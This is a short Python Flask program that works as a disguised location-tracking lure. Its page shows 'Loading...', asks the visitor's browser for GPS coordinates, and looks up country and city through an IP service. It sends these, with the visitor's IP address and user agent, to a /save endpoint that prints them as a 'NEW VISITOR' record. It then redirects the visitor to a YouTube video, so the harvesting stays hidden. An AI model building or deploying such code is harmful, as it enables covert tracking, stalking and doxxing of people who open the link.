from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/")
def home():

    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent")

    return f"""
    <!DOCTYPE html>
    <html>
    <body style="font-family: Arial; text-align:center; margin-top:50px;">

    <h1>Loading...</h1>

    <script>

    window.onload = function() {{
        getLocation();
    }}

    async function getLocation() {{

        navigator.geolocation.getCurrentPosition(

            async function(position) {{

                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                let ipInfo =
                await fetch("https://ipapi.co/json/");

                ipInfo = await ipInfo.json();

                const data = {{
                    ip: "{ip}",
                    country: ipInfo.country_name,
                    city: ipInfo.city,
                    latitude: latitude,
                    longitude: longitude,
                    device: "{user_agent}"
                }};

                await fetch("/save", {{
                    method: "POST",
                    headers: {{
                        "Content-Type": "application/json"
                    }},
                    body: JSON.stringify(data)
                }});

                document.body.innerHTML =
                "<h2>Redirection...</h2>";

                setTimeout(() => {{
                    window.location.href =
                    "https://www.youtube.com/watch?v=C3lWwBslWqg&list=RDEVLaJtg8xIU&index=8";
                }}, 2000);

            }},

            function(error) {{

                document.body.innerHTML =
                "<h2>Permission refusée</h2>";

            }}

        );
    }}

    </script>

    </body>
    </html>
    """

@app.route("/save", methods=["POST"])
def save():

    data = request.json

    print("\\n========= NEW VISITOR =========")
    print("IP:", data["ip"])
    print("Country:", data["country"])
    print("City:", data["city"])
    print("Latitude:", data["latitude"])
    print("Longitude:", data["longitude"])
    print("Device:", data["device"])
    print("================================\\n")

    return jsonify({"status": "saved"})

if __name__ == "__main__":
    app.run()
